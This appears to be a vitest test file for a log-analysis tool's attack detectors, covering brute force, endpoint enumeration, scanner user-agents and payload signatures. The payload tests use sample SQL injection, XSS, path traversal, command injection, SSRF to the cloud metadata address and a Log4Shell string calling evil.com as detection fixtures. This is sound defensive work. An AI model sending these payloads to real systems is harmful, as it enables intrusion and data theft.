import { describe, it, expect } from 'vitest';
import { makeDataset, allRows } from '@/test/factory';
import { bruteForce } from './detectors/bruteForce';
import { httpErrorBurst } from './detectors/httpErrorBurst';
import { endpointEnum } from './detectors/endpointEnum';
import { offHours } from './detectors/offHours';
import { payloadSignatures } from './detectors/payloadSignatures';
import { scannerUa } from './detectors/scannerUa';
import { runProfiles } from './profiles';

/** 6 failed logins from .66 inside 60s, plus noise from other IPs. */
function authDataset() {
  const rows: [string, string, string][] = [
    ['2026-06-19T08:00:01', 'login_failed', '10.0.0.66'],
    ['2026-06-19T08:00:08', 'login_failed', '10.0.0.66'],
    ['2026-06-19T08:00:15', 'login_failed', '10.0.0.66'],
    ['2026-06-19T08:00:22', 'login_failed', '10.0.0.66'],
    ['2026-06-19T08:00:36', 'login_failed', '10.0.0.66'],
    ['2026-06-19T08:00:52', 'login_failed', '10.0.0.66'],
    ['2026-06-19T08:00:10', 'login_ok', '10.0.0.7'],
    ['2026-06-19T09:30:00', 'login_failed', '10.0.0.9'], // lone failure
  ];
  return makeDataset(
    [
      { name: 'timestamp', type: 'date' },
      { name: 'event', type: 'string' },
      { name: 'src_ip', type: 'string' },
    ],
    rows,
  );
}

describe('bruteForce', () => {
  it('flags a source with ≥threshold failures inside the window', () => {
    const ds = authDataset();
    const findings = bruteForce(ds, allRows(ds));
    expect(findings).toHaveLength(1);
    expect(findings[0].entity).toBe('10.0.0.66');
    expect(findings[0].rule).toBe('brute-force');
    expect(findings[0].count).toBe(6);
    expect(findings[0].severity).toBe('high'); // 6 failures: ≥threshold(5) but < 3×threshold
    expect(findings[0].technique).toBe('T1110 · Brute Force');
  });

  it('does not flag spread-out failures beyond the window', () => {
    const ds = authDataset();
    const findings = bruteForce(ds, allRows(ds), { windowMs: 5_000 });
    expect(findings).toHaveLength(0);
  });

  it('no-ops when there is no timestamp or source column', () => {
    const ds = makeDataset(
      [{ name: 'msg', type: 'string' }],
      [['login_failed'], ['login_failed']],
    );
    expect(bruteForce(ds, allRows(ds))).toEqual([]);
  });
});

describe('httpErrorBurst', () => {
  it('flags a client with ≥threshold 4xx/5xx responses', () => {
    const ds = makeDataset(
      [
        { name: 'status_code', type: 'number' },
        { name: 'client_ip', type: 'string' },
      ],
      [
        [500, '10.0.0.9'],
        [503, '10.0.0.9'],
        [404, '10.0.0.9'],
        [401, '10.0.0.9'],
        [500, '10.0.0.9'],
        [200, '10.0.0.7'],
      ],
    );
    const findings = httpErrorBurst(ds, allRows(ds), { threshold: 5 });
    expect(findings).toHaveLength(1);
    expect(findings[0].entity).toBe('10.0.0.9');
    expect(findings[0].count).toBe(5);
    expect(findings[0].rule).toBe('http-error-burst');
  });
});

describe('endpointEnum', () => {
  it('flags a source hitting many distinct 4xx endpoints', () => {
    const rows = Array.from({ length: 7 }, (_, i) => [404, `/admin/${i}`, '10.0.0.30']);
    rows.push([200, '/home', '10.0.0.7']);
    const ds = makeDataset(
      [
        { name: 'status_code', type: 'number' },
        { name: 'endpoint', type: 'string' },
        { name: 'client_ip', type: 'string' },
      ],
      rows,
    );
    const findings = endpointEnum(ds, allRows(ds));
    expect(findings).toHaveLength(1);
    expect(findings[0].entity).toBe('10.0.0.30');
    expect(findings[0].count).toBe(7);
    expect(findings[0].technique).toBe('T1595.003 · Wordlist Scanning');
  });

  it('ignores repeated hits on the same endpoint (distinct only)', () => {
    const rows = Array.from({ length: 8 }, () => [404, '/login', '10.0.0.30']);
    const ds = makeDataset(
      [
        { name: 'status_code', type: 'number' },
        { name: 'endpoint', type: 'string' },
        { name: 'client_ip', type: 'string' },
      ],
      rows,
    );
    expect(endpointEnum(ds, allRows(ds))).toEqual([]);
  });
});

describe('offHours', () => {
  it('flags a source with ≥threshold events outside business hours', () => {
    const ds = makeDataset(
      [
        { name: 'timestamp', type: 'date' },
        { name: 'src_ip', type: 'string' },
      ],
      [
        ['2026-06-19T02:14:00', '10.0.0.99'],
        ['2026-06-19T03:01:00', '10.0.0.99'],
        ['2026-06-19T23:40:00', '10.0.0.99'],
        ['2026-06-19T09:00:00', '10.0.0.99'], // business hours → ignored
        ['2026-06-19T01:00:00', '10.0.0.7'], // below threshold
      ],
    );
    const findings = offHours(ds, allRows(ds));
    expect(findings).toHaveLength(1);
    expect(findings[0].entity).toBe('10.0.0.99');
    expect(findings[0].count).toBe(3);
    expect(findings[0].technique).toBe('T1078 · Valid Accounts');
  });
});

describe('payloadSignatures', () => {
  it('flags SQLi, XSS and traversal payloads per source', () => {
    const ds = makeDataset(
      [
        { name: 'url', type: 'string' },
        { name: 'client_ip', type: 'string' },
      ],
      [
        ["/search?q=' OR 1=1 --", '203.0.113.9'],
        ['/products?id=1 UNION SELECT x FROM users', '203.0.113.9'],
        ['/p?next=<script>alert(1)</script>', '203.0.113.9'],
        ['/d?file=../../../../etc/passwd', '203.0.113.9'],
        ['/home', '10.0.0.7'],
      ],
    );
    const findings = payloadSignatures(ds, allRows(ds));
    // sqli (2 rows), xss (1), traversal (1) → 3 findings, all for the attacker.
    expect(findings).toHaveLength(3);
    expect(findings.every((f) => f.entity === '203.0.113.9')).toBe(true);
    expect(
      findings.every((f) => f.technique === 'T1190 · Exploit Public-Facing Application'),
    ).toBe(true);
    expect(findings.find((f) => f.detail.includes('SQL injection'))?.count).toBe(2);
  });

  it('flags command-injection, SSRF and Log4Shell payloads', () => {
    const ds = makeDataset(
      [
        { name: 'url', type: 'string' },
        { name: 'client_ip', type: 'string' },
      ],
      [
        ['/ping?host=8.8.8.8; cat /etc/hosts', '10.0.0.1'],
        ['/fetch?u=http://169.254.169.254/latest/meta-data', '10.0.0.1'],
        ['/api?x=${jndi:ldap://evil.com/a}', '10.0.0.1'],
      ],
    );
    const details = payloadSignatures(ds, allRows(ds)).map((f) => f.detail).join(' | ');
    expect(details).toContain('Command injection');
    expect(details).toContain('SSRF');
    expect(details).toContain('Log4Shell');
  });

  it('no-ops when there is no request/url column', () => {
    const ds = makeDataset([{ name: 'level', type: 'string' }], [['INFO'], ['ERROR']]);
    expect(payloadSignatures(ds, allRows(ds))).toEqual([]);
  });
});

describe('scannerUa', () => {
  it('flags known scanner user-agents per source', () => {
    const ds = makeDataset(
      [
        { name: 'user_agent', type: 'string' },
        { name: 'client_ip', type: 'string' },
      ],
      [
        ['sqlmap/1.7', '45.9.1.7'],
        ['Mozilla/5.0', '10.0.0.7'],
        ['Nikto/2.5.0', '45.9.1.7'],
      ],
    );
    const findings = scannerUa(ds, allRows(ds));
    expect(findings).toHaveLength(2); // sqlmap + nikto, both from .7
    expect(findings.every((f) => f.entity === '45.9.1.7')).toBe(true);
    expect(findings.every((f) => f.rule === 'scanner-tool')).toBe(true);
  });

  it('no-ops without a user-agent column', () => {
    const ds = makeDataset([{ name: 'level', type: 'string' }], [['INFO']]);
    expect(scannerUa(ds, allRows(ds))).toEqual([]);
  });
});

describe('runProfiles', () => {
  it('runs all profiles and concatenates findings', () => {
    const ds = authDataset();
    const findings = runProfiles(ds, allRows(ds));
    // Only brute-force applies to this schema (no status/endpoint column, and
    // all events are during business hours).
    expect(findings.map((f) => f.rule)).toEqual(['brute-force']);
  });

  it('can restrict to a subset of profiles by id', () => {
    const ds = authDataset();
    expect(runProfiles(ds, allRows(ds), ['http-error-burst'])).toEqual([]);
  });
});
